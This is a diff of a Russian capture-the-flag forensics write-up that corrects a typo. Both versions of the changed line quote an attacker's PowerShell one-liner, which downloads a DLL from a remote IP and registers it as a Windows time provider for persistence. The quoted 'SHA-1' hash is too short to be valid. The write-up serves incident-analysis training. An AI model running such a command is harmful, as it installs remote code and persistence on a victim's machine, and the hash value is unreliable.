@@ -26,7 +26,7 @@
 ![Файлы к таску](PwnSec24/Images/подозрительные_файлы.png)
 
 ### 2. Получение хеша
-Иследовав файлы, которые лежат в таске, можно найти такую команду ```C:\Windows\System32\cmd.exe /c "powershell iwr http://20.0.145.51/windows_update/windows_update.dll -OutFile C:\Windows\Upd.dll; reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time\TimeProviders\CMDProvider /v DllName /d C:\Windows\Upd.dll /f```. Теперь узнаем как загрузили файл и получим его хеш-сумму.
+Исследовав файлы, которые лежат в таске, можно найти такую команду ```C:\Windows\System32\cmd.exe /c "powershell iwr http://20.0.145.51/windows_update/windows_update.dll -OutFile C:\Windows\Upd.dll; reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time\TimeProviders\CMDProvider /v DllName /d C:\Windows\Upd.dll /f```. Теперь узнаем как загрузили файл и получим его хеш-сумму.
 Подозрительный файл был загружен по ссылке: ```http://20.0.145.51/windows_update/windows_update.dll```
 Хеш-сумма была получена с помощью команды:
 ```sha1sum windows_update.dll``` -> получаем ```6f4fda52dccf52ef968fde2e35a4539a8472```
